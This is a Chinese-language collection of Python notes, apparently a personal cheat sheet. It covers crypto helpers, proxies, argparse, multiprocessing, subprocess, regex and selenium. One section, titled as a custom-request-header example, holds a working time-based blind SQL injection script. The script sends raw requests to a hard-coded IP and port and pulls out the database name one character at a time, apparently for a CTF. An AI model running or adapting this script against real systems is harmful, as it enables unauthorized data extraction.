# python



## pycrypto

```
getPrime(N):获得N bits 的质数
inverse(a,b):获得a相对于b的模反元素
bytes_to_long:bytes和数字互相转化
bytes_to_long(b'felinae')
long_to_bytes:bytes和数字互相转化
long_to_bytes(28821963924201829)
getStrongPrime(1024,fN):获得一个长1024于fN互质的随机数
```





## 自定义输出内容颜色

```
from termcolor import *
print(colored("Error: this is an error.","red"))
print(colored("Warning: this is a warning.","yellow"))
```





## requests 模块 使用代理

requests使用代理要比urllib简单多了…这里以单次代理为例. 多次的话可以用session一类构建.

如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:

```python
import requests

proxies = {
  "http": "http://10.10.1.10:3128",
  "https": "http://10.10.1.10:1080",
}

r=requests.get("http://icanhazip.com", proxies=proxies)
print r.text


```



### 使用全局代理



```python
import socks
import socket
from urllib import request
from urllib.error import URLError

socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9742)
socket.socket = socks.socksocket
try:
    response = request.urlopen('http://httpbin.org/get')
    print(response.read().decode('utf-8'))
except URLError as e:
    print(e.reason)
```



## numpy

### 解多元一次方程

> x+y=10
> x+z=20
> y+z=24

```python
import numpy as np
#导入指定成员
from scipy.linalg import solve 
a = np.array([[1, 1,0], [1,0,1], [0,1, 1]])
b = np.array([10, 20, 24])
x = solve(a, b)
print(x)
```



## python 装饰器

 https://foofish.net/python-decorator.html 



## python命令行

### 命令行参数读取

`sys.argv[x]`



## Python执行系统命令并获得输出




```python
import os
 
print(os.popen('uptime').read())

 
```



```python
import subprocess
 
res = subprocess.Popen('uptime',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
result = res.stdout.readlines()
 
```



## 自定义请求头



```python
import requests
import hackhttp 
import urllib
import socket

ip = '111.186.57.61'
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding="ascii"))
            res = conn.recv(10240).decode()

    except:
        return True
    
    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = "http://111.186.57.61:10601/?age={}".format(sql)
    raw='''GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

'''.format(sql).replace("\n","\r\n")
    return send_raw(raw)


l='0123456789ABCDEF'
result=""
for j in range(10):
    for i in l:
        sql="if((select substr(hex(database()),{},1))=char({}),sleep(10),0)".format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print("第{}个字符不是{}".format(j+1,i))
        




```



## 正则

### re.match函数

re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。

**函数语法**：

```
re.match(pattern, string, flags=0)
```

### re.search方法

re.search 扫描整个字符串并返回第一个成功的匹配。

函数语法：

```
re.search(pattern, string, flags=0)
```



###  将字符串中的匹配的数字乘以 2 

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import re
 
# 将匹配的数字乘以 2
def double(matched):
    value = int(matched.group('value'))
    return str(value * 2)
 
s = 'A23G4HFD567'
print(re.sub('(?P<value>\d+)', double, s))
```



## dir()和`__dict__`的区别

最简单的一句发是`__dict__`是dir的子集合



 https://stackoverflow.com/questions/13302917/whats-the-difference-between-dirself-and-self-dict/13302981#13302981 



所以以后查看对象的所有属性一定要用dir()



## 参数解析

### Argparse



#### 模板



```python
import argparse
parser = argparse.ArgumentParser(description="calculate X to the power of Y")#程序帮助
parser.add_argument('-v','--version',default=0,type=int,action='store_true',nargs="+")
#add_argument default设置参数默认值,type代表参数值类型,action代表拿到参数后执行的动作,nargs 代表参数个数
#action大全
#'store' - 存储参数的值。这是默认的动作。
#'store_const' - 存储被 const 命名参数指定的值。
#'store_true' and 'store_false' - 这些是 'store_const' 分别用作存储 True 和 False 值的特殊用例。
#'append' - 存储一个列表，并且将每个参数值追加到列表中。在允许多次使用选项时很有用。
#'append_const' - 这存储一个列表，并将 const 命名参数指定的值追加到列表中。（注意 const 命名参数默认为 None。）``'append_const'`` 动作一般在多个参数需要在同一列表中存储常数时会有用。
#'count' - 计算一个关键字参数出现的数目或次数。
#'extend' - This stores a list, and extends each argument value to the list. 

#设置冲突选项
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-q", "--quiet", action="store_true")

#

```





#### 实例



```python
import argparse

parser = argparse.ArgumentParser(description="calculate X to the power of Y")
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-q", "--quiet", action="store_true")
parser.add_argument("x", type=int, help="the base")
parser.add_argument("y", type=int, help="the exponent")
args = parser.parse_args()
answer = args.x**args.y

if args.quiet:
    print(answer)
elif args.verbose:
    print("{} to the power {} equals {}".format(args.x, args.y, answer))
else:
    print("{}^{} == {}".format(args.x, args.y, answer))
```



```shell
$ python3 prog.py --help
usage: prog.py [-h] [-v | -q] x y

calculate X to the power of Y

positional arguments:
  x              the base
  y              the exponent

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose
  -q, --quiet
```



## 多进程

### linux/mac/unix下用fork来创建进程

```python
import os

print('Process (%s) start...' % os.getpid())
# Only works on Unix/Linux/Mac:
pid = os.fork()
if pid == 0:
    print('I am child process (%s) and my parent is %s.' % (os.getpid(), os.getppid()))
else:
    print('I (%s) just created a child process (%s).' % (os.getpid(), pid))
```

### multiprocessing

#### Process

```python
from multiprocessing import Process
import os

# 子进程要执行的代码
def run_proc(name):
    print('Run child process %s (%s)...' % (name, os.getpid()))

if __name__=='__main__':
    print('Parent process %s.' % os.getpid())
    p = Process(target=run_proc, args=('test',))
    print('Child process will start.')
    p.start()#开始执行
    p.join()#等待进程p结束
    print('Child process end.')
```

#### Pool

```python
from multiprocessing import Pool
import os, time, random

def long_time_task(name):
    print('Run task %s (%s)...' % (name, os.getpid()))
    start = time.time()
    time.sleep(random.random() * 3)
    end = time.time()
    print('Task %s runs %0.2f seconds.' % (name, (end - start)))

if __name__=='__main__':
    print('Parent process %s.' % os.getpid())
    p = Pool(4)#最多同时执行4个进程
    for i in range(5):
        p.apply_async(long_time_task, args=(i,))#向进程池中添加任务
    print('Waiting for all subprocesses done...')
    p.close()
    p.join()
    print('All subprocesses done.')
```

 对`Pool`对象调用`join()`方法会等待所有子进程执行完毕，调用`join()`之前必须先调用`close()`，调用`close()`之后就不能继续添加新的`Process`了。 

##### 进程间通信

 使用进程池创建的进程通信，使用Manager().Queue() 



#### Queue (进程间通信)

```python
from multiprocessing import Process, Queue
import os, time, random

# 写数据进程执行的代码:
def write(q):
    print('Process to write: %s' % os.getpid())
    for value in ['A', 'B', 'C']:
        print('Put %s to queue...' % value)
        q.put(value)
        time.sleep(random.random())

# 读数据进程执行的代码:
def read(q):
    print('Process to read: %s' % os.getpid())
    while True:
        value = q.get(True)
        print('Get %s from queue.' % value)

if __name__=='__main__':
    # 父进程创建Queue，并传给各个子进程：
    q = Queue()
    pw = Process(target=write, args=(q,))
    pr = Process(target=read, args=(q,))
    # 启动子进程pw，写入:
    pw.start()
    # 启动子进程pr，读取:
    pr.start()
    # 等待pw结束:
    pw.join()
    # pr进程里是死循环，无法等待其结束，只能强行终止:
    pr.terminate()
```



### subprocess

```python
import subprocess

print('$ nslookup www.python.org')
r = subprocess.call(['nslookup', 'www.python.org'])#前面是要执行的命令,后面是参数
print('Exit code:', r)
```



```python
import subprocess

print('$ nslookup')
p = subprocess.Popen(['nslookup'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output, err = p.communicate(b'set q=mx\npython.org\nexit\n')#向子进程输入
print(output.decode('utf-8'))
print('Exit code:', p.returncode)
```



## 匿名函数

`lambda x:x*x`

关键字`lambda`表示匿名函数，冒号前面的`x`表示函数参数。

匿名函数有个限制，就是只能有一个表达式，不用写`return`，返回值就是该表达式的结果。

### 使用技巧

搭配map使用

```python
list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))
```





## 遇到的问题

### 在Linux下导文件夹包出现No module named XXX的问题

明明存在，但是无法导入

>原来在python模块的每一个包中，都有一个`__init__.py`文件（这个文件定义了包的属性和方法）然后是一些模块文件和子目录，假如子目录中也有 `__init__.py` 那么它就是这个包的子包了。当你将一个包作为模块导入（比如从 xml导入 dom ）的时候，实际上导入了它的 `__init__.py` 文件。
>
>一个包是一个带有特殊文件 `__init__.py` 的目录。`__init__.py` 文件定义了包的属性和方法。其实它可以什么也不定义；可以只是一个空文件，但是必须存在。如果 `__init__.py` 不存在，这个目录就仅仅是一个目录，而不是一个包，它就不能被导入或者包含其它的模块和嵌套包。
>
>`__init__.py` 文件:
>
>`__init__.py` 控制着包的导入行为。假如 `__init__.py` 为空，那么仅仅导入包是什么都做不了的。





### windows open("xx","w")会自动将'\n'替换成'\r\n'

 "w"方式写时的'\n'会在被系统自动替换为'\r\n' 

  "wb"方式写时的'\n'不会在被系统自动替换为'\r\n' 

 "r"方式读时，文件中的'\r\n'会被系统替换为'\n' 

 "rb"方式读时，文件中的'\r\n'不会被系统替换为'\n' 



## selenium

```
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Firefox()
driver.get("http://www.python.org")
assert "Python" in driver.title
elem = driver.find_element_by_name("q")
elem.clear()
elem.send_keys("pycon")
elem.send_keys(Keys.RETURN)
assert "No results found." not in driver.page_source
driver.close()
```



### 设置浏览器路径

```python
webdriver.Chrome(executable_path='/usr/local/bin/chromedriver')
#或
webdriver.Chrome('/usr/local/bin/chromedriver')
#或
#add path  /usr/local/bin/chromedriver
```





### 设置代理

```python
from selenium import webdriver
PROXY = "88.157.149.250:8080" # IP:PORT or HOST:PORT

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)
chrome = webdriver.Chrome(options=chrome_options)

```

